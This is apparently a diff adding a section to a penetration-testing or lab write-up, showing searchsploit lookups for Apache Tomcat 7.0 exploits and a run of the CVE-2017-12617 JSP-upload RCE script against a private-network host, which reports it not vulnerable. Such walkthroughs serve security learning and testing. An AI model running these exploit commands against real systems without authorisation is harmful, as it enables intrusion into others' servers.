@@ -93,3 +93,48 @@ Nmap done: 1 IP address (1 host up) scanned in 37.91 seconds
 ```
 
 </details>
+
+# 2. Attempting to exploit tomcat
+
+```console
+┌──(root㉿kali)-[~]
+└─# searchsploit tomcat 7.0
+---------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                  |  Path
+---------------------------------------------------------------------------------------------------------------- ---------------------------------
+Apache Tomcat 7.0.4 - 'sort' / 'orderBy' Cross-Site Scripting                                                   | linux/remote/35011.txt
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)    | windows/webapps/42953.txt
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)    | jsp/webapps/42966.py
+---------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+┌──(root㉿kali)-[~]
+└─# searchsploit -m 42966
+  Exploit: Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)
+      URL: https://www.exploit-db.com/exploits/42966
+     Path: /usr/share/exploitdb/exploits/jsp/webapps/42966.py
+    Codes: CVE-2017-12617
+ Verified: True
+File Type: Python script, ASCII text executable
+Copied to: /root/42966.py
+
+┌──(root㉿kali)-[~]
+└─# python3 42966.py -u http://10.0.88.35:8080
+
+
+
+   _______      ________    ___   ___  __ ______     __ ___   __ __ ______
+  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
+ | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /
+ | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /
+ | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /
+  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/
+
+
+
+[@intx0x80]
+
+
+Poc Filename  Poc.jsp
+Not Vulnerable to CVE-2017-12617
+```
